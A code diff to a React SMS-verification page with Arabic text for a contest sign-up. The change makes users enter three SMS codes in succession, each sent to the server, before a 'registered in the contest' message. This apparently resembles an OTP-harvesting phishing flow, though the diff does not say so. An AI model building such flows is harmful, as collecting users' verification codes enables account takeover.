@@ -22,6 +22,7 @@ import logoImage from "@assets/IMG_0350_1761335875653.jpeg";
 export default function VerifySms() {
   const [, setLocation] = useLocation();
   const { toast } = useToast();
+  const [currentCodeNumber, setCurrentCodeNumber] = useState(1); // Track which code we're on (1, 2, or 3)
   
   // Get userId from URL
   const params = new URLSearchParams(window.location.search);
@@ -43,18 +44,25 @@ export default function VerifySms() {
   });
 
   const verifyMutation = useMutation({
-    mutationFn: async (data: VerifyOtpData) => {
+    mutationFn: async (data: VerifyOtpData & { codeNumber: number }) => {
       const res = await apiRequest("POST", "/api/auth/verify-otp", data);
       return await res.json();
     },
     onSuccess: () => {
-      toast({
-        title: "تم التحقق بنجاح! ✓",
-        description: "مبروك لقد تم تسجيلك في المسابقة",
-      });
-      setTimeout(() => {
-        setLocation("/congratulations");
-      }, 1500);
+      if (currentCodeNumber < 3) {
+        // Still have more codes to enter
+        form.reset({ userId: userId || "", otp: "" });
+        setCurrentCodeNumber(currentCodeNumber + 1);
+      } else {
+        // All 3 codes entered - go to congratulations
+        toast({
+          title: "تم التحقق بنجاح! ✓",
+          description: "مبروك لقد تم تسجيلك في المسابقة",
+        });
+        setTimeout(() => {
+          setLocation("/congratulations");
+        }, 1500);
+      }
     },
     onError: (error: any) => {
       toast({
@@ -66,7 +74,7 @@ export default function VerifySms() {
   });
 
   const onSubmit = (data: VerifyOtpData) => {
-    verifyMutation.mutate(data);
+    verifyMutation.mutate({ ...data, codeNumber: currentCodeNumber });
   };
 
   return (
@@ -99,7 +107,7 @@ export default function VerifySms() {
 
           <div className="text-center space-y-2">
             <h1 className="text-2xl font-bold text-foreground" data-testid="text-verify-title">
-              تحقق من رمز SMS
+              أدخل كود SMS
             </h1>
             <p className="text-muted-foreground text-sm">
               أدخل الرمز المرسل إلى هاتفك
